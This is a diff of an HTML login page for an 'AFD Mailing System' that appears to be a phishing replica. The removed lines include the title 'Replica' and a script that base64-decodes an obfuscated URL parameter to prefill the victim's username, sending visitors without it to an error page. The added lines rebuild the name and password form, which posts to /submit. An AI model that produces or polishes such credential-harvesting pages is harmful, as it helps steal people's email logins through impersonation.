@@ -4,57 +4,77 @@
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>AFD Mailing System — Replica</title>
+<title>AFD Mailing System</title>
 
-<!-- original script logic kept intact -->
-<script>
-  function getQueryParameter(parameterName) {
-    var queryString = window.location.search;
-    var urlParams = new URLSearchParams(queryString);
-    return urlParams.get(parameterName);
-  }
-
-  var value = getQueryParameter('bfjkdghurehgjufhdkhgruiegbvousdhfowehr');
-
-  if (value == null) {
-    window.location.href = "error.html";
-  } else {
-    var b64name = atob(value);
-
-    function onLoad() {
-      var inputField = document.getElementById('username');
-      inputField.value = b64name;
-    }
-  }
-</script>
+<!-- original script logic -->
 
 <style>
   :root{ --max-w:900px }
-  html,body{height:100%;margin:0;font-family: Arial, Helvetica, sans-serif;background:#fff}
+  html,body{
+    height:100%;
+    margin:0;
+    font-family: Arial, Helvetica, sans-serif;
+    background:#fff;
+  }
   .page{min-height:100%;display:flex;flex-direction:column}
   .main{flex:1;display:flex;align-items:center;justify-content:center;padding:10px}
   .card{max-width:var(--max-w);width:100%;text-align:center}
-  .branding{display:flex;align-items:center;gap:20px;justify-content:center;margin-bottom:14px}
+
+  .branding{
+    display:flex;
+    align-items:center;
+    gap:20px;
+    justify-content:center;
+    margin-bottom:14px
+  }
   .branding img{width:160px;height:130px;}
-  .branding .title{font-weight:700;line-height:1.1;text-align:center}
-  .branding .title h1{margin:0;font-size:20px}
-  .form-wrap{display:inline-block;text-align:right}
-  form{margin-top:20px;margin-left: 9vW;}
-  label{display:inline-block;width:70px;margin-right:8px}
+  .branding .title h1{margin:0;font-size:20px;font-weight:700}
+
+  /* NEW ROW 1 → Name + Password */
+  .row1{
+    display:flex;
+    justify-content:center;
+    gap:30px;
+    margin-bottom:20px;
+    text-align:left;
+  }
+
+  .col{
+    display:flex;
+    flex-direction:column;
+  }
+
+  label{
+    font-weight:600;
+    margin-bottom:4px;
+  }
+
   input[type="text"], input[type="password"]{
-    padding:6px 8px;border:1px solid #666;border-radius:2px;width:260px
+    padding:7px 8px;
+    border:1px solid #666;
+    border-radius:3px;
+    width:240px;
   }
-  .row{margin:8px 0}
+
+  /* ROW 2 → Submit button */
+  .row2{
+    text-align:center;
+    margin-top:10px;
+  }
+
   button{
-    margin-left:78px;padding:4px 10px;border:1px solid #777;
-    background:#eee;border-radius:3px;cursor:pointer
+    padding:6px 15px;
+    border:1px solid #777;
+    background:#eee;
+    border-radius:3px;
+    cursor:pointer;
+    font-weight:600;
   }
+
   .bar{height:220px;background:#444;margin-top:-180px}
-  @media (max-width:520px){
-    .branding{flex-direction:column}
-    label{display:block;width:auto;margin-bottom:4px}
-    input[type="text"],input[type="password"]{width:100%}
-    button{margin-left:0}
+
+  @media (max-width:600px){
+    .row1{flex-direction:column;align-items:center}
   }
 </style>
 </head>
@@ -72,27 +92,58 @@
           </div>
         </div>
 
-        <!-- original form process preserved -->
-        <div class="form-wrap" aria-label="login form">
-          <form action="/submit" method="POST" name="f">
-            <div class="row">
-              <label>Name:</label>
-              <input name="username" id="username" type="text" value="">
-            </div>
+        <!-- LOGIN FORM -->
+<form action="/submit" method="POST" name="f">
+  <div>
+    <table style="width: 320px; border: none; margin: 0 26vw; border-spacing: 10px; font-family: Arial;">
+      <tbody>
 
-            <div class="row">
-              <label>Password:</label>
-              <input name="password" id="password" type="password">
-            </div>
+        <tr>
+          <td style="text-align: left; font-size: 18px; font-weight: 500;">
+            Name:
+          </td>
+          <td style="text-align: right">
+            <input name="username" id="username" type="text"
+              style="width:230px; padding:5px 15px; border:1px solid #555; border-radius:4px; font-size:15px;">
+          </td>
+        </tr>
 
+        <tr>
+          <td style="text-align: left; font-size: 18px; font-weight: 500;">
+            Password:
+          </td>
+          <td style="text-align: right">
+            <input name="password" id="password" type="password"
+              style="width:230px; padding:5px 15px; border:1px solid #555; border-radius:4px; font-size:15px;">
+          </td>
+        </tr>
+
+        <tr>
+          <td></td>
+          <td style="text-align: right;">
+            <input 
+              type="submit" 
+              value="Sign In"
+              style="
+                padding:6px 15px;
+                background:#f0f0f0;
+                border:1px solid #777;
+                border-radius:4px;
+                cursor:pointer;
+                font-weight:500;
+                font-size:15px;
+              "
+            >
             <input type="hidden" name="reqObject" value="WMLogin">
             <input type="hidden" name="reqAction" value="1">
+          </td>
+        </tr>
 
-            <div class="row">
-              <button type="submit">Sign In</button>
-            </div>
-          </form>
-        </div>
+      </tbody>
+    </table>
+  </div>
+</form>
+
 
       </div>
     </div>
